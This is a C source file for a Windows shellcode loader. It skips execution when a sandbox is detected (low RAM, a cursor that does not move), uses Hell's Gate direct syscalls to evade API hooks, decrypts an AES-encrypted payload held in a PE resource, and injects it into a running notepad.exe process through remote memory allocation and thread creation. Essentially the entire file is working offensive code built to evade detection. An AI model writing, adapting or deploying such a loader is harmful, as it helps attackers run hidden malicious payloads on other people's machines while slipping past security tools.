#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "resource.h"
#include "aes.h"
#include "key.h"
#include "syscalls.h"

BOOL is_sandbox() {
    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof(mem_status);
    GlobalMemoryStatusEx(&mem_status);
    DWORD ram_gb = (DWORD)(mem_status.ullTotalPhys / (1024 * 1024 * 1024));
    if (ram_gb < 4) return TRUE;

    POINT pos1, pos2;
    GetCursorPos(&pos1);
    Sleep(1000);
    GetCursorPos(&pos2);
    if (pos1.x == pos2.x && pos1.y == pos2.y) return TRUE;

    return FALSE;
}

DWORD find_pid(const char *proc_name) {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, proc_name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return pid;
}

int main () {
    if (is_sandbox()) return 0;

    // ============================================================
    // Hell's Gate: Resolve all SSNs at startup
    // ============================================================
    VX_TABLE vxTable;
    if (!InitializeVxTable(&vxTable)) {
        printf("[!] Failed to initialize VxTable (Hell's Gate failed)!\n");
        return 1;
    }
    printf("[+] Hell's Gate: VxTable initialized!\n");
    printf("    NtOpenProcess           SSN: 0x%04x\n", vxTable.NtOpenProcess.wSSN);
    printf("    NtAllocateVirtualMemory SSN: 0x%04x\n", vxTable.NtAllocateVirtualMemory.wSSN);
    printf("    NtWriteVirtualMemory    SSN: 0x%04x\n", vxTable.NtWriteVirtualMemory.wSSN);
    printf("    NtProtectVirtualMemory  SSN: 0x%04x\n", vxTable.NtProtectVirtualMemory.wSSN);
    printf("    NtCreateThreadEx        SSN: 0x%04x\n", vxTable.NtCreateThreadEx.wSSN);

    // ============================================================
    // Step 0: Find notepad.exe PID
    // ============================================================
    DWORD pid = find_pid("notepad.exe");
    if (pid == 0) {
        printf("[!] notepad.exe not found!\n");
        return 1;
    }
    printf("[+] Target: notepad.exe (PID: %lu)\n", pid);

    // ============================================================
    // Step 1: NtOpenProcess (replaces OpenProcess)
    // ============================================================
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    CLIENT_ID ci = { (HANDLE)(ULONG_PTR)pid, NULL };
    NTSTATUS status = SysNtOpenProcess(&hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        &oa, &ci, &vxTable.NtOpenProcess);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtOpenProcess failed! NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] NtOpenProcess success! Handle: 0x%p\n", hProcess);

    // ============================================================
    // Load & decrypt payload from PE resource (same as before)
    // ============================================================
    HRSRC res = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA);
    HGLOBAL res_data = LoadResource(NULL, res);
    LPVOID payload_data = LockResource(res_data);
    DWORD payload_size = SizeofResource(NULL, res);

    LPVOID local_buf = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(local_buf, payload_data, payload_size);

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aes_key, aes_iv);
    AES_CBC_decrypt_buffer(&ctx, (uint8_t *)local_buf, payload_size);
    printf("[+] Payload decrypted locally.\n");

    // ============================================================
    // Step 2: NtAllocateVirtualMemory (replaces VirtualAllocEx)
    // ============================================================
    PVOID remote_buf = NULL;
    SIZE_T alloc_size = payload_size;
    status = SysNtAllocateVirtualMemory(hProcess, &remote_buf, 0, &alloc_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        &vxTable.NtAllocateVirtualMemory);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtAllocateVirtualMemory failed! NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] NtAllocateVirtualMemory success! Remote addr: 0x%p\n", remote_buf);

    // ============================================================
    // Step 3: NtWriteVirtualMemory (replaces WriteProcessMemory)
    // ============================================================
    status = SysNtWriteVirtualMemory(hProcess, remote_buf, local_buf, payload_size, NULL,
        &vxTable.NtWriteVirtualMemory);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtWriteVirtualMemory failed! NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] NtWriteVirtualMemory success!\n");

    VirtualFree(local_buf, 0, MEM_RELEASE);

    // ============================================================
    // Step 4: NtProtectVirtualMemory (replaces VirtualProtectEx)
    // ============================================================
    ULONG oldprotect = 0;
    SIZE_T protect_size = payload_size;
    status = SysNtProtectVirtualMemory(hProcess, &remote_buf, &protect_size,
        PAGE_EXECUTE_READ, &oldprotect,
        &vxTable.NtProtectVirtualMemory);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtProtectVirtualMemory failed! NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] NtProtectVirtualMemory success! (RW -> RX)\n");

    // ============================================================
    // Step 5: NtCreateThreadEx (replaces CreateRemoteThread)
    // ============================================================
    HANDLE th = NULL;
    status = SysNtCreateThreadEx(&th, THREAD_ALL_ACCESS, NULL, hProcess,
        remote_buf, NULL, FALSE, 0, 0, 0, NULL,
        &vxTable.NtCreateThreadEx);
    if (!NT_SUCCESS(status)) {
        printf("[!] NtCreateThreadEx failed! NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] NtCreateThreadEx success! Shellcode is running in notepad.exe!\n");

    WaitForSingleObject(th, INFINITE);
    CloseHandle(th);
    CloseHandle(hProcess);

    printf("[+] Done.\n");
    return 0;
}